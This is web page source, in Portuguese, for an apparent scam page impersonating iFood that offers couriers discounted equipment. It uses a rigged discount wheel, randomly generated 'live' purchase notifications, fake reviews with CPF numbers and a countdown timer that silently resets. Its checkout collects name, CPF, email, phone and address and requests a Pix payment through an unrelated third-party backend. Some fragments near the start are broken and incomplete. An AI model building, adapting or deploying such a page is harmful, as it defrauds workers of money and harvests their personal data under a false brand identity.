    <!-- Scripts Essenciais do React e Babel -->
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>

    <!-- Fontes -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">

    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f3f4f6;
            overflow-x: hidden;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        .animate-bounce-in {
            animation: bounceIn 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55) forwards;
        }
        
        .animate-fade-in {
            animation: fadeIn 0.4s ease-in-out forwards;
        }

        @keyframes bounceIn {
            0% { transform: scale(0.9); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }
        
        @keyframes fadeIn {
            0% { opacity: 0; transform: translateY(10px); }
            100% { opacity: 1; transform: translateY(0); }
        }

        .confetti {
            position: fixed;
            width: 10px;
            height: 10px;
            background-color: #f00;
            animation: confetti-fall 3s linear infinite;
            z-index: 9999;
        }

        @keyframes confetti-fall {
            0% { transform: translateY(-10vh) rotate(0deg); opacity: 1; }
            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
        }

        .hide-scrollbar::-webkit-scrollbar {
            display: none;
        }
        .hide-scrollbar {
            -ms-overflow-style: none;
            scrollbar-width: none;
        }
        
        .spinner {
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 3px solid #ffffff;
            width: 20px;
            height: 20px;
            -webkit-animation: spin 1s linear infinite;
            animation: spin 1s linear infinite;
        }
        
        .spinner-red {
            border: 3px solid rgba(234, 29, 44, 0.2);
            border-top: 3px solid #EA1D2C;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .shipping-card {
            border: 2px solid #e5e7eb;
            transition: all 0.3s ease;
            cursor: pointer;
        }
        .shipping-card.active {
            border-color: #EA1D2C;
            background-color: #fff1f2;
            box-shadow: 0 4px 12px rgba(234, 29, 44, 0.1);
        }

        .step-pill {
            height: 6px;
            flex-grow: 1;
            border-radius: 10px;
            transition: background-color 0.3s;
        }
    </style>
</head>

            constructor(props) { super(props); this.state = { hasError: false }; }

                    return (

                    );
                }
                return this.props.children;

        const PreQualification = ({ onComplete }) => {
            const [step, setStep] = React.useState(1);
            const [loading, setLoading] = React.useState(false);
            const [answers, setAnswers] = React.useState({});

            const handleAnswer = (questionNum, answer) => {
                playSound('click');
                setAnswers({...answers, [questionNum]: answer});
                if (questionNum < 4) {
                    setTimeout(() => setStep(questionNum + 1), 350);
                }
            };

            const handleConfirm = () => {
                playSound('click');
                setLoading(true);
                setTimeout(() => {
                    setLoading(false);
                    onComplete();

                            </div>

                        <p className="text-sm text-gray-600 mb-8 font-medium leading-relaxed">Essa condição é destinada para entregadores do iFood. Antes de liberar o acesso aos produtos com desconto, precisamos confirmar algumas informações.</p>
                        
                        <div className="space-y-4">

        const NotificationToast = () => {
            const [notif, setNotif] = React.useState(null);
            const [visible, setVisible] = React.useState(false);

            React.useEffect(() => {
                const trigger = () => {
                    const name = NOTIF_NAMES[Math.floor(Math.random() * NOTIF_NAMES.length)];
                    const initial = NOTIF_INITIALS[Math.floor(Math.random() * NOTIF_INITIALS.length)];
                    const action = NOTIF_ACTIONS[Math.floor(Math.random() * NOTIF_ACTIONS.length)];
                    
                    setNotif({ name: `${name} ${initial}`, text: action });
                    setVisible(true);
                    setTimeout(() => setVisible(false), 4500);
                };
                const interval = setInterval(trigger, 16000); // Mostra uma notificação nova a cada 16 segundos
                setTimeout(trigger, 4000); // Primeira notificação após 4 segundos
                return () => clearInterval(interval);
            }, []);

            if (!visible || !notif) return null;

            return (
                <div className="fixed top-20 left-1/2 transform -translate-x-1/2 bg-gray-900/95 text-white px-4 py-3 rounded-2xl text-[11px] shadow-2xl z-50 flex items-center gap-3 animate-fade-in max-w-[90vw] w-max border border-gray-700">
                    <div className="w-6 h-6 bg-green-500/20 rounded-full flex items-center justify-center shrink-0">
                        <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                    </div>
                    <span className="font-medium text-gray-200">
                        <b className="text-green-400 font-black tracking-wide">{notif.name}</b> {notif.text}
                    </span>
                </div>
            );

        );

        const Wheel = ({ onFinish }) => {
            const [spinning, setSpinning] = React.useState(false);
            const [rotation, setRotation] = React.useState(0);

            const spin = () => {
                if (spinning) return;
                setSpinning(true);
                playSound('spin');
                
                const winIndex = Math.floor(Math.random() * PRIZES.length); 
                const prize = PRIZES[winIndex];
                
                const spins = 5;
                const segmentAngle = 360 / PRIZES.length;
                const offset = Math.floor(Math.random() * (segmentAngle - 10)) - (segmentAngle / 2) + 5;
                const targetRotation = rotation + (spins * 360) + (360 - (winIndex * segmentAngle)) - (rotation % 360) + offset;
                
                setRotation(targetRotation);
                setTimeout(() => { setSpinning(false); playSound('win'); onFinish(prize); }, 4000);
            };

            return (
                <div className="flex flex-col min-h-[calc(100vh-56px)] bg-[#f8f9fa] relative overflow-hidden animate-fade-in">
                    <div className="absolute top-0 left-1/2 transform -translate-x-1/2 w-[200%] sm:w-[150%] h-[55vh] sm:h-[60vh] bg-[#EA1D2C] rounded-b-[50%] z-0"></div>
                    <div className="relative z-10 pt-6 px-4 flex flex-col items-center w-full">
                        <span className="bg-black/15 px-5 py-1.5 rounded-full text-xs font-bold text-white mb-4 backdrop-blur-sm uppercase tracking-wider">Acesso Validado</span>
                        <h1 className="text-3xl sm:text-4xl font-black text-white tracking-tight text-center leading-tight mb-2">Ative seu desconto de hoje</h1>
                        <p className="text-white/90 text-center text-sm font-medium max-w-[280px] mx-auto leading-snug">Cada acesso libera uma condição diferente de desconto.<br/><br/>Clique abaixo para ativar sua condição promocional.</p>
                    </div>
                    <div className="relative z-10 flex-1 flex flex-col items-center justify-center mt-2 mb-28 transform scale-95 sm:scale-100">
                        <div className="w-[320px] h-[320px] rounded-full bg-[#EA1D2C] flex items-center justify-center shadow-2xl relative">
                            <div className="w-[300px] h-[300px] rounded-full bg-white relative flex items-center justify-center shadow-inner">
                                <div className="w-[260px] h-[260px] rounded-full overflow-hidden" style={{ transform: `rotate(${rotation}deg)`, transition: 'transform 4s cubic-bezier(0.15, 0.85, 0.35, 1)' }}>
                                    <svg width="100%" height="100%" viewBox="0 0 260 260">
                                        {PRIZES.map((prize, i) => {
                                            const angle = 60;
                                            const startAngle = i * angle;
                                            const endAngle = (i + 1) * angle;
                                            const radius = 130;
                                            const center = 130;
                                            const x1 = center + radius * Math.cos((startAngle - 90) * Math.PI / 180);
                                            const y1 = center + radius * Math.sin((startAngle - 90) * Math.PI / 180);
                                            const x2 = center + radius * Math.cos((endAngle - 90) * Math.PI / 180);
                                            const y2 = center + radius * Math.sin((endAngle - 90) * Math.PI / 180);
                                            return (
                                                <g key={i}>
                                                    <path d={`M ${center} ${center} L ${x1} ${y1} A ${radius} ${radius} 0 0 1 ${x2} ${y2} Z`} fill={prize.color} stroke="#ffffff" strokeWidth="2" />
                                                    <text x={center + 85 * Math.cos((startAngle + 30 - 90) * Math.PI / 180)} y={center + 85 * Math.sin((startAngle + 30 - 90) * Math.PI / 180)} fill="white" fontSize="42" fontWeight="900" textAnchor="middle" dominantBaseline="middle" transform={`rotate(${startAngle + 30}, ${center + 85 * Math.cos((startAngle + 30 - 90) * Math.PI / 180)}, ${center + 85 * Math.sin((startAngle + 30 - 90) * Math.PI / 180)})`}>?</text>
                                                </g>
                                            );
                                        })}
                                    </svg>
                                </div>
                                <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 z-20 flex flex-col items-center">
                                    <div className="w-0 h-0 border-l-[10px] border-r-[10px] border-b-[16px] border-transparent border-b-[#EA1D2C] -mb-[4px] relative z-10 drop-shadow-md"></div>
                                    <div className="w-16 h-16 bg-[#EA1D2C] rounded-full shadow-lg flex flex-col items-center justify-center border-[4px] border-white relative z-20">
                                        <span className="text-white font-black italic text-2xl tracking-tighter">iF</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div className="fixed bottom-0 left-0 w-full bg-white z-20 rounded-t-[30px] shadow-[0_-10px_25px_rgba(0,0,0,0.05)] pt-6 pb-8 px-4 border-t border-gray-100">
                        <button onClick={spin} disabled={spinning} className={`w-full text-white font-bold text-lg py-4 rounded-xl shadow-lg transition-transform active:scale-95 uppercase tracking-wide ${spinning ? 'bg-gray-400' : 'bg-[#EA1D2C]'}`}>
                            {spinning ? 'ATIVANDO...' : 'ATIVAR DESCONTO'}
                        </button>
                    </div>
                </div>
            );
        };

        const BannerCarousel = () => {
            const [currentIndex, setCurrentIndex] = React.useState(0);
            React.useEffect(() => {
                const interval = setInterval(() => { setCurrentIndex((prev) => (prev + 1) % STORE_BANNERS.length); }, 4000);
                return () => clearInterval(interval);
            }, []);
            return (
                <div className="relative w-full rounded-xl overflow-hidden mb-4 shadow-md bg-transparent flex items-center justify-center">
                    <img src={STORE_BANNERS[0]} className="w-full h-auto opacity-0 block pointer-events-none" alt="spacer" />
                    {STORE_BANNERS.map((banner, index) => (
                        <img key={index} src={banner} alt="banner" className={`absolute top-0 left-0 w-full h-full object-contain transition-opacity duration-700 ease-in-out ${index === currentIndex ? 'opacity-100 z-10' : 'opacity-0 z-0'}`} />
                    ))}
                    <div className="absolute bottom-2 left-0 right-0 flex justify-center gap-1.5 z-20">
                        {STORE_BANNERS.map((_, index) => <div key={index} className={`h-1.5 rounded-full transition-all duration-300 ${index === currentIndex ? 'w-4 bg-white' : 'w-1.5 bg-white/50'}`}></div>)}
                    </div>
                </div>
            );
        };

        const FAQAccordion = () => {
            const [openIdx, setOpenIdx] = React.useState(null);
            return (
                <div className="mt-6 mb-4 text-left">
                    <h3 className="font-black text-gray-800 uppercase mb-3 tracking-wide text-xs flex items-center gap-2">
                        <svg className="w-4 h-4 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                        Dúvidas Frequentes
                    </h3>
                    <div className="space-y-2">
                        {FAQS.map((faq, i) => (
                            <div key={i} className="bg-white border border-gray-100 rounded-xl overflow-hidden shadow-sm">
                                <button onClick={() => setOpenIdx(openIdx === i ? null : i)} className="w-full p-4 text-left font-bold text-gray-700 text-[11px] flex justify-between items-center transition-colors">
                                    {faq.q}
                                    <svg className={`w-4 h-4 text-gray-400 transition-transform ${openIdx === i ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" /></svg>
                                </button>
                                {openIdx === i && <div className="p-4 pt-0 text-[11px] text-gray-500 leading-relaxed bg-white border-t border-gray-50">{faq.a}</div>}
                            </div>
                        ))}
                    </div>
                </div>
            );
        };

        const Reviews = ({ productId }) => {
            const reviews = REVIEWS_BY_PRODUCT_ID[productId] || []; 
            if (reviews.length === 0) return null;
            return (
                <div className="mt-8 border-t border-gray-100 pt-6 text-left">
                    <h4 className="font-black text-gray-800 text-[11px] uppercase tracking-widest mb-4 flex items-center gap-2">
                        Relatos Recentes
                    </h4>
                    <div className="space-y-3">
                        {reviews.map((rev, i) => (
                            <div key={i} className="bg-gray-50/80 p-4 rounded-xl border border-gray-100">
                                <div className="flex justify-between items-start mb-2">
                                    <div className="flex items-center gap-2">
                                        <div className="w-6 h-6 bg-gray-200 rounded-full flex items-center justify-center text-[10px] font-bold text-gray-500">{rev.name.charAt(0)}</div>
                                        <div>
                                            <div className="text-[11px] font-bold text-gray-800 leading-none mb-1">{rev.name}</div>
                                            <div className="text-[9px] text-gray-400 font-mono">CPF {rev.cpf}</div>
                                        </div>
                                    </div>
                                    <div className="flex">{[...Array(5)].map((_, j) => <svg key={j} className="w-3 h-3 text-yellow-400 fill-current" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z" /></svg>)}</div>
                                </div>
                                <p className="text-[11px] text-gray-600 leading-relaxed italic">"{rev.text}"</p>
                            </div>
                        ))}
                    </div>
                </div>
            );
        };

        const PrizeRevealModal = ({ show, prize, onRedeem }) => {
            if (!show || !prize) return null;
            return (
                <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
                    <div className="absolute inset-0 overflow-hidden pointer-events-none">
                        {[...Array(30)].map((_, i) => (
                            <div key={i} className="confetti" style={{ left: `${Math.random() * 100}vw`, animationDuration: `${Math.random() * 2 + 2}s`, animationDelay: `${Math.random() * 2}s`, backgroundColor: ['#EA1D2C', '#F59E0B', '#10B981', '#3B82F6'][Math.floor(Math.random()*4)] }}></div>
                        ))}
                    </div>
                    <div className="bg-white rounded-[24px] w-full max-w-sm p-8 text-center shadow-2xl transform transition-all animate-bounce-in relative z-10 border border-gray-100">
                        <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4 border-4 border-white shadow-lg -mt-16">
                            <svg className="h-10 w-10 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
                        </div>
                        <h2 className="text-2xl font-black text-gray-800 mb-2 leading-tight">Desconto ativado com sucesso</h2>
                        <p className="text-gray-500 mb-6 text-xs leading-relaxed">Sua condição promocional já foi aplicada automaticamente.<br/><br/>Você pode utilizar esse desconto agora nos produtos disponíveis abaixo. O valor com desconto aparece direto na página do produto.</p>
                        <div className="bg-gray-50 border-2 border-dashed border-[#EA1D2C] rounded-xl p-5 mb-6">
                            <span className="block text-[10px] text-gray-400 font-bold uppercase mb-1">Desconto Ativado:</span>
                            <span className="block text-4xl font-black text-[#EA1D2C] tracking-tighter">{prize.reveal}</span>
                        </div>
                        <button onClick={onRedeem} className="w-full bg-[#EA1D2C] text-white font-black py-4 rounded-xl shadow-[0_8px_20px_rgba(234,29,44,0.3)] flex items-center justify-center gap-2 transition-transform active:scale-95 uppercase tracking-wide">
                            VER PRODUTOS
                        </button>
                    </div>
                </div>
            );
        };

        const Checkout = ({ product, discount, onBack, initialPix }) => {
            const [step, setStep] = React.useState(initialPix ? 3 : 1);
            const [loading, setLoading] = React.useState(false);
            const [formData, setFormData] = React.useState({ name: '', cpf: '', email: '', phone: '', cep: '', street: '', number: '', neighborhood: '', city: '', state: '' });
            const [pixData, setPixData] = React.useState(initialPix);
            const [selectedSize, setSelectedSize] = React.useState(null);
            const [shippingSelected, setShippingSelected] = React.useState(false);
            const [sizeError, setSizeError] = React.useState(false);
            const [timeLeft, setTimeLeft] = React.useState(600);
            const numRef = React.useRef(null);
            
            const shippingCostValue = 14.98;
            const productPrice = parseFloat(calculatePrice(product.originalPrice, discount));
            const totalAmount = productPrice + (shippingSelected ? shippingCostValue : 0);

            React.useEffect(() => {
                let timer;
                if (pixData) {
                    timer = setInterval(() => {
                        setTimeLeft(prev => prev <= 1 ? 600 : prev - 1);
                    }, 1000);
                }
                return () => clearInterval(timer);
            }, [pixData]);

            React.useEffect(() => {
                if (step === 3 && formData.street && numRef.current) {
                    setTimeout(() => numRef.current.focus(), 300);
                }
            }, [step, formData.street]);

            const handleCepChange = async (e) => {
                const val = e.target.value;
                const cepInput = val.replace(/\D/g, '');
                let formattedCep = cepInput;
                if (cepInput.length > 5) formattedCep = cepInput.replace(/^(\d{5})(\d)/, '$1-$2');

                setFormData(prev => ({ ...prev, cep: formattedCep }));
                
                if (cepInput.length === 8) {
                    try {
                        const res = await fetch(`https://viacep.com.br/ws/${cepInput}/json/`);
                        const data = await res.json();
                        if (!data.erro) {
                            setFormData(prev => ({ ...prev, street: data.logradouro, neighborhood: data.bairro, city: data.localidade, state: data.uf, cep: formattedCep }));
                            if (step === 3 && numRef.current) {
                                setTimeout(() => numRef.current.focus(), 100);
                            }
                        }
                    } catch (err) {}
                } else if (cepInput.length < 8 && formData.street) {
                    setFormData(prev => ({ ...prev, street: '', neighborhood: '', city: '', state: '' }));
                    setShippingSelected(false);
                }
            };

            const generatePix = async (e) => {
                e.preventDefault();
                if (!shippingSelected) { alert("Por favor, selecione a transportadora para continuar."); return; }
                playSound('click');
                setLoading(true);
                
                const valorEmCentavos = Math.round(totalAmount * 100);

                try {
                    const BACKEND_URL = 'https://meubeck.onrender.com/api/gerar-pix';

                    const response = await fetch(BACKEND_URL, {
                        method: 'POST',
                        mode: 'cors', // Permite cruzar domínios de forma segura
                        headers: { 
                            'Accept': 'application/json',
                            'Content-Type': 'application/json' 
                        },
                        body: JSON.stringify({
                            amount: valorEmCentavos,
                            description: product.name,
                            customer: {
                                name: formData.name,
                                email: formData.email,
                                phone: formData.phone.replace(/\D/g, '')
                            }
                        })
                    });

                    if (!response.ok) {
                        throw new Error(`Servidor respondeu com erro ${response.status}`);
                    }

                    const data = await response.json();

                    if (data && data.qr_code) {
                        setPixData(data);
                        safeSetLocal('entregador_active_pix', data);
                        safeSetLocal('entregador_selected_product', product);
                        window.scrollTo(0,0);
                    } else {
                        alert("Erro ao gerar Pix. Verifique os dados ou tente novamente.");
                    }
                } catch (err) { 
                    console.error("Erro de conexão no generatePix:", err);
                    alert("Aviso: Ocorreu um erro de comunicação com o servidor de pagamentos. \n\nIsso pode ocorrer porque o servidor gratuito entra em modo de 'espera' após um tempo inativo. Por favor, aguarde cerca de 45 segundos e clique em FINALIZAR novamente!"); 
                } finally { 
                    setLoading(false); 
                }
            };

            if (pixData) {
                const mins = Math.floor(timeLeft / 60).toString().padStart(2, '0');
                const secs = (timeLeft % 60).toString().padStart(2, '0');

                return (
                    <div className="min-h-screen bg-gray-50 pb-20 pt-4 px-4 animate-bounce-in text-center flex flex-col items-center">
                        <h2 className="text-xl font-black text-gray-800 mb-1 mt-6 uppercase">Aguardando Pagamento</h2>
                        <p className="text-xs text-gray-500 mb-4 px-4">Copie o código PIX abaixo e pague no app do seu banco para liberar o envio.</p>
                        
                        <div className="bg-white rounded-[24px] shadow-lg p-6 max-w-sm w-full mx-auto relative overflow-hidden border border-gray-100">
                            
                            <div className="bg-red-50 text-[#EA1D2C] font-black text-[11px] py-2 px-4 rounded-xl mb-6 inline-flex items-center gap-2 border border-red-100">
                                <svg className="w-4 h-4 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                                O CÓDIGO EXPIRA EM {mins}:{secs}
                            </div>

                            <div className="mb-6 p-4 bg-gray-50 rounded-2xl border-2 border-dashed border-gray-200">
                                <img src={`https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(pixData.qr_code)}`} alt="QR Code" className="mx-auto mix-blend-multiply" />
                            </div>
                            
                            <button onClick={() => { playSound('click'); navigator.clipboard.writeText(pixData.qr_code); alert("PIX Copiado com sucesso!"); }} className="w-full bg-[#10B981] active:bg-green-700 text-white font-black py-4 rounded-xl shadow-lg mb-4 transition-transform active:scale-95 uppercase tracking-widest text-[11px]">COPIAR CÓDIGO PIX</button>
                            
                            <div className="pt-4 border-t border-gray-100 mt-2">
                                <p className="text-[9px] text-gray-400 font-bold uppercase tracking-widest">Processado com segurança por Paradise Pags</p>
                            </div>
                        </div>
                    </div>
                );
            }

            return (
                <div className="min-h-screen bg-gray-50 pb-20 animate-fade-in">
                    <div className="bg-white shadow-sm sticky top-0 z-30">
                        <div className="p-4 flex items-center gap-3">
                            <button onClick={step === 1 ? () => { playSound('click'); onBack(); } : () => { playSound('click'); setStep(step - 1); }}>
                                <svg className="h-6 w-6 text-gray-600" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" /></svg>
                            </button>
                            <h2 className="font-black text-lg text-gray-800 tracking-tight">Resgatar Prêmio</h2>
                        </div>
                        <div className="px-6 pb-4 flex gap-2">
                            <div className={`step-pill ${step >= 1 ? 'bg-[#EA1D2C]' : 'bg-gray-200'}`}></div>
                            <div className={`step-pill ${step >= 2 ? 'bg-[#EA1D2C]' : 'bg-gray-200'}`}></div>
                            <div className={`step-pill ${step >= 3 ? 'bg-[#EA1D2C]' : 'bg-gray-200'}`}></div>
                        </div>
                    </div>

                    <div className="container mx-auto px-4 pt-4 max-w-md">
                        {step === 1 && (
                            <div className="space-y-6 animate-bounce-in">
                                <div className="bg-white rounded-[24px] shadow-sm p-6 text-center border border-gray-100">
                                    <div className="bg-gray-50 rounded-2xl p-4 mb-5 border border-gray-100">
                                        <img src={product.image} className="w-48 mx-auto h-48 object-contain mix-blend-multiply" />
                                    </div>
                                    <h3 className="font-black text-gray-800 mb-2 leading-tight uppercase">{product.name}</h3>
                                    <div className="text-[#EA1D2C] font-black text-3xl mb-6 tracking-tighter">R$ {productPrice.toFixed(2).replace('.', ',')}</div>
                                    
                                    {product.sizes && (
                                        <div className={`mb-6 p-4 rounded-2xl transition-all text-left ${sizeError ? 'border-2 border-[#EA1D2C] bg-red-50/50' : 'border-2 border-transparent'}`}>
                                            <p className={`text-[10px] font-black uppercase mb-3 ${sizeError ? 'text-[#EA1D2C]' : 'text-gray-400'}`}>
                                                {sizeError ? '⚠️ Obrigatório escolher tamanho:' : 'Selecione o Tamanho:'}
                                            </p>
                                            <div className="flex flex-wrap gap-2">
                                                {product.sizes.map(size => (
                                                    <button key={size} onClick={() => { playSound('click'); setSelectedSize(size); setSizeError(false); }} className={`w-12 h-12 flex items-center justify-center text-sm font-black rounded-xl border-2 transition-all ${selectedSize === size ? 'bg-[#EA1D2C] text-white border-[#EA1D2C] shadow-md scale-105' : (sizeError ? 'bg-white border-red-200 text-red-500' : 'bg-white border-gray-200 text-gray-500 hover:border-gray-300')}`}>{size}</button>
                                                ))}
                                            </div>
                                        </div>
                                    )}

                                    <button onClick={() => { 
                                        playSound('click'); 
                                        if (product.sizes && !selectedSize) { setSizeError(true); return; }
                                        setStep(2); window.scrollTo(0,0);
                                    }} className="w-full bg-[#EA1D2C] text-white font-black py-4 rounded-xl shadow-[0_8px_20px_rgba(234,29,44,0.3)] uppercase tracking-wide">AVANÇAR</button>
                                    
                                    <Reviews productId={product.id} />
                                </div>
                            </div>
                        )}

                        {step === 2 && (
                            <form onSubmit={(e) => { e.preventDefault(); playSound('click'); setStep(3); window.scrollTo(0,0); }} className="bg-white p-6 rounded-[24px] shadow-sm space-y-4 border border-gray-100 animate-fade-in">
                                <div><label className="text-[10px] font-black text-gray-400 uppercase ml-1">Nome Completo</label><input required type="text" className="w-full bg-gray-50 border border-gray-200 rounded-xl p-3 text-sm focus:outline-none focus:border-[#EA1D2C] font-medium mt-1" placeholder="Ex: José da Silva" onChange={e => setFormData({...formData, name: e.target.value})} /></div>
                                <div><label className="text-[10px] font-black text-gray-400 uppercase ml-1">CPF</label><input required type="tel" className="w-full bg-gray-50 border border-gray-200 rounded-xl p-3 text-sm focus:outline-none focus:border-[#EA1D2C] font-medium mt-1" placeholder="000.000.000-00" onChange={e => setFormData({...formData, cpf: e.target.value})} /></div>
                                <div><label className="text-[10px] font-black text-gray-400 uppercase ml-1">E-mail</label><input required type="email" className="w-full bg-gray-50 border border-gray-200 rounded-xl p-3 text-sm focus:outline-none focus:border-[#EA1D2C] font-medium mt-1" placeholder="seu@email.com" onChange={e => setFormData({...formData, email: e.target.value})} /></div>
                                <div><label className="text-[10px] font-black text-gray-400 uppercase ml-1">Celular / WhatsApp</label><input required type="tel" className="w-full bg-gray-50 border border-gray-200 rounded-xl p-3 text-sm focus:outline-none focus:border-[#EA1D2C] font-medium mt-1" placeholder="(00) 00000-0000" onChange={e => setFormData({...formData, phone: e.target.value})} /></div>
                                <button type="submit" className="w-full bg-[#EA1D2C] text-white font-black py-4 rounded-xl shadow-[0_8px_20px_rgba(234,29,44,0.3)] mt-4 uppercase tracking-wide">CONTINUAR PARA ENDEREÇO</button>
                            </form>
                        )}

                        {step === 3 && (
                            <form onSubmit={generatePix} className="bg-white p-6 rounded-[24px] shadow-sm border border-gray-100 space-y-4 animate-fade-in">
                                <div className="space-y-3">
                                    <div><label className="text-[10px] font-black text-gray-400 uppercase ml-1">CEP (Busca automática)</label><input required className="w-full bg-gray-50 border border-gray-200 rounded-xl p-3 text-sm font-black focus:outline-none focus:border-[#EA1D2C] mt-1 text-gray-700" placeholder="00000-000" value={formData.cep} onChange={handleCepChange} /></div>
                                    <div className="flex gap-2">
                                        <div className="w-3/4"><label className="text-[10px] font-black text-gray-300 uppercase ml-1">Endereço</label><input required className="w-full bg-gray-100 border-none rounded-xl p-3 text-[11px] font-medium text-gray-500 mt-1" value={formData.street} readOnly /></div>
                                        <div className="w-1/4"><label className="text-[10px] font-black text-[#EA1D2C] uppercase text-center block">Nº</label><input ref={numRef} required className="w-full bg-gray-50 border-2 border-red-100 rounded-xl p-3 text-sm font-black focus:outline-none focus:border-[#EA1D2C] text-center mt-1" placeholder="123" onChange={e => setFormData({...formData, number: e.target.value})} /></div>
                                    </div>
                                    <div className="flex gap-2">
                                        <div className="w-1/2"><label className="text-[10px] font-black text-gray-300 uppercase ml-1">Bairro</label><input required className="w-full bg-gray-100 border-none rounded-xl p-3 text-[11px] font-medium text-gray-500 mt-1" value={formData.neighborhood} readOnly /></div>
                                        <div className="w-1/2"><label className="text-[10px] font-black text-gray-300 uppercase ml-1">Cidade</label><input required className="w-full bg-gray-100 border-none rounded-xl p-3 text-[11px] font-medium text-gray-500 mt-1" value={formData.city} readOnly /></div>
                                    </div>
                                </div>

                                <div className="pt-4 border-t border-gray-100">
                                    <label className="block text-[10px] font-black text-gray-400 uppercase mb-3 ml-1">Transportadora Oficial</label>
                                    <div onClick={() => { playSound('click'); setShippingSelected(!shippingSelected); }} className={`shipping-card p-4 rounded-xl flex items-center gap-4 ${shippingSelected ? 'active' : 'bg-gray-50'}`}>
                                        <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${shippingSelected ? 'bg-[#EA1D2C] border-[#EA1D2C]' : 'border-gray-300'}`}>
                                            {shippingSelected && <svg className="h-3 w-3 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>}
                                        </div>
                                        <div className="flex-1 text-left">
                                            <h4 className="text-xs font-black text-gray-800 leading-none mb-1 uppercase">Entrega Loggi</h4>
                                            <p className="text-[9px] text-gray-500 font-bold tracking-widest uppercase">3 a 5 dias</p>
                                        </div>
                                        <div className="text-right">
                                            <span className="text-sm font-black text-[#EA1D2C]">R$ 14,98</span>
                                        </div>
                                    </div>
                                </div>

                                <div className="bg-gray-50 p-5 rounded-xl border border-gray-100 mt-4 space-y-2">
                                    <div className="flex justify-between text-[11px] text-gray-500 font-medium"><span>Custo do Equipamento</span><span className="line-through">R$ {product.originalPrice.toFixed(2)}</span></div>
                                    <div className="flex justify-between text-[11px] text-gray-500 font-bold"><span>Condição Promocional</span><span className="text-green-500">-R$ {(product.originalPrice - productPrice).toFixed(2).replace('.', ',')}</span></div>
                                    <div className="flex justify-between text-[11px] text-gray-500 font-medium border-b border-gray-200 pb-2"><span>Taxa Logística</span><span>{shippingSelected ? 'R$ 14,98' : 'Pendente'}</span></div>
                                    <div className="flex justify-between text-sm font-black text-gray-800 pt-1 items-center uppercase"><span className="text-[10px]">Total a Pagar</span><span className="text-[#EA1D2C] text-lg tracking-tighter">R$ {totalAmount.toFixed(2).replace('.', ',')}</span></div>
                                </div>
                                <button type="submit" disabled={loading} className="w-full bg-green-600 hover:bg-green-700 text-white font-black py-4 rounded-xl shadow-[0_8px_20px_rgba(22,163,74,0.3)] flex items-center justify-center gap-2 uppercase tracking-wide active:scale-95 transition-all mt-2">
                                    {loading ? <div className="spinner"></div> : "FINALIZAR RESGATE"}
                                </button>
                                <p className="text-center text-[9px] font-bold text-gray-400 uppercase tracking-widest mt-4">Pagamento Seguro e Processado com Criptografia</p>
                            </form>
                        )}
                    </div>
                </div>
            );
        };

        const Store = ({ discount, onSelectProduct }) => {
            const [activeCategory, setActiveCategory] = React.useState('home');
            
            let filteredProducts = [];
            if (activeCategory === 'home') {
                const destaqueIds = [1, 3, 7, 10]; 
                filteredProducts = PRODUCTS.filter(p => destaqueIds.includes(p.id));
            } else if (activeCategory === 'all') {
                filteredProducts = PRODUCTS;
            } else {
                filteredProducts = PRODUCTS.filter(p => p.category === activeCategory);
            }

            return (
                <div className="pb-20 animate-fade-in bg-gray-50 min-h-screen relative">
                    <div className="bg-[#1f2937] text-white p-2 px-4 flex justify-center items-center sticky top-[53px] z-30 shadow-md">
                        <div className="flex items-center gap-2 text-[10px] font-black tracking-widest uppercase">
                             <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
                             <span className="text-green-400">Condição Promocional Ativada</span>
                        </div>
                    </div>

                    <div className="container mx-auto px-4 pt-4 text-center">
                        <BannerCarousel />

                        <div className="bg-white p-6 rounded-2xl shadow-sm border border-gray-100 mb-6 mt-6 text-left">
